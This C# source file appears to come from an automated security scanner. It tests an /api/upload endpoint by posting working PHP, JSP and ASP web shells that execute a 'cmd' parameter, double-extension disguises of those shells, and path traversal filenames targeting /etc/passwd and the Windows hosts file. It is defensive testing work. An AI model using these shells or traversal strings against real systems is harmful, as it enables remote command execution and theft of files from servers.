using AttackAgent.Models;
using Serilog;
using System.Net;

namespace AttackAgent
{
    /// <summary>
    /// Tests for file upload vulnerabilities including malicious file uploads,
    /// path traversal, type bypasses, and file execution
    /// </summary>
    public class FileUploadTester : IDisposable
    {
        private readonly SecurityHttpClient _httpClient;
        private readonly ILogger _logger;

        public FileUploadTester(string baseEndpoint = "")
        {
            _httpClient = new SecurityHttpClient(baseEndpoint);
            _logger = Log.ForContext<FileUploadTester>();
        }

        /// <summary>
        /// Tests for file upload vulnerabilities
        /// </summary>
        public async Task<List<Vulnerability>> TestForFileUploadVulnerabilitiesAsync(ApplicationProfile profile)
        {
            _logger.Information("📁 Starting file upload testing...");
            var vulnerabilities = new List<Vulnerability>();

            try
            {
                // Test malicious file uploads
                await TestMaliciousFileUploadsAsync(profile, vulnerabilities);
                
                // Test path traversal
                await TestPathTraversalAsync(profile, vulnerabilities);
                
                // Test file type bypasses
                await TestFileTypeBypassesAsync(profile, vulnerabilities);

                _logger.Information("File upload testing completed. Found {Count} vulnerabilities", vulnerabilities.Count);
            }
            catch (Exception ex)
            {
                _logger.Error(ex, "Error during file upload testing");
            }

            return vulnerabilities;
        }

        private async Task TestMaliciousFileUploadsAsync(ApplicationProfile profile, List<Vulnerability> vulnerabilities)
        {
            _logger.Debug("Testing malicious file uploads...");
            
            // Test various malicious file types
            var maliciousFiles = new[]
            {
                ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-httpd-php"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                ("shell.asp", "<% eval request(\"cmd\") %>", "application/x-asp"),
                ("shell.jspx", "<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"cmd\"));</jsp:scriptlet>", "application/x-jspx"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
                ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp")
            };

            foreach (var (filename, content, contentType) in maliciousFiles)
            {
                var response = await _httpClient.PostAsync("/api/upload", content, null, contentType);
                
                if (response.StatusCode == HttpStatusCode.OK || response.StatusCode == HttpStatusCode.Created)
                {
                    vulnerabilities.Add(new Vulnerability
                    {
                        Id = Guid.NewGuid().ToString(),
                        Title = "Malicious File Upload",
                        Description = $"Application accepts malicious file: {filename}",
                        Severity = SeverityLevel.Critical,
                        Type = VulnerabilityType.FileUpload,
                        Endpoint = "/api/upload",
                        Evidence = $"Filename: {filename}, Content-Type: {contentType}",
                        Remediation = "Implement strict file type validation and content scanning",
                        DiscoveredAt = DateTime.UtcNow
                    });
                }
            }
        }

        private async Task TestPathTraversalAsync(ApplicationProfile profile, List<Vulnerability> vulnerabilities)
        {
            _logger.Debug("Testing path traversal...");
            
            // Test path traversal in file names
            var pathTraversalFiles = new[]
            {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%255C..%255C..%255Cwindows%255Csystem32%255Cdrivers%255Cetc%255Chosts"
            };

            foreach (var filename in pathTraversalFiles)
            {
                var content = "test content";
                var response = await _httpClient.PostAsync($"/api/upload?filename={filename}", content);
                
                if (response.StatusCode == HttpStatusCode.OK || response.StatusCode == HttpStatusCode.Created)
                {
                    vulnerabilities.Add(new Vulnerability
                    {
                        Id = Guid.NewGuid().ToString(),
                        Title = "Path Traversal Vulnerability",
                        Description = $"Application accepts path traversal in filename: {filename}",
                        Severity = SeverityLevel.High,
                        Type = VulnerabilityType.PathTraversal,
                        Endpoint = "/api/upload",
                        Evidence = $"Filename: {filename}",
                        Remediation = "Validate and sanitize file paths",
                        DiscoveredAt = DateTime.UtcNow
                    });
                }
            }
        }

        private async Task TestFileTypeBypassesAsync(ApplicationProfile profile, List<Vulnerability> vulnerabilities)
        {
            _logger.Debug("Testing file type bypasses...");
            
            // Test various file type bypass techniques
            var bypassFiles = new[]
            {
                ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
                ("shell.php.png", "<?php system($_GET['cmd']); ?>", "image/png"),
                ("shell.php.gif", "<?php system($_GET['cmd']); ?>", "image/gif"),
                ("shell.php.txt", "<?php system($_GET['cmd']); ?>", "text/plain"),
                ("shell.php.doc", "<?php system($_GET['cmd']); ?>", "application/msword"),
                ("shell.php.pdf", "<?php system($_GET['cmd']); ?>", "application/pdf"),
                ("shell.php.zip", "<?php system($_GET['cmd']); ?>", "application/zip"),
                ("shell.php.rar", "<?php system($_GET['cmd']); ?>", "application/x-rar-compressed"),
                ("shell.php.tar", "<?php system($_GET['cmd']); ?>", "application/x-tar"),
                ("shell.php.gz", "<?php system($_GET['cmd']); ?>", "application/gzip")
            };

            foreach (var (filename, content, contentType) in bypassFiles)
            {
                var response = await _httpClient.PostAsync("/api/upload", content, null, contentType);
                
                if (response.StatusCode == HttpStatusCode.OK || response.StatusCode == HttpStatusCode.Created)
                {
                    vulnerabilities.Add(new Vulnerability
                    {
                        Id = Guid.NewGuid().ToString(),
                        Title = "File Type Bypass",
                        Description = $"Application accepts file with double extension: {filename}",
                        Severity = SeverityLevel.High,
                        Type = VulnerabilityType.FileUpload,
                        Endpoint = "/api/upload",
                        Evidence = $"Filename: {filename}, Content-Type: {contentType}",
                        Remediation = "Validate file content, not just extension or MIME type",
                        DiscoveredAt = DateTime.UtcNow
                    });
                }
            }
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}

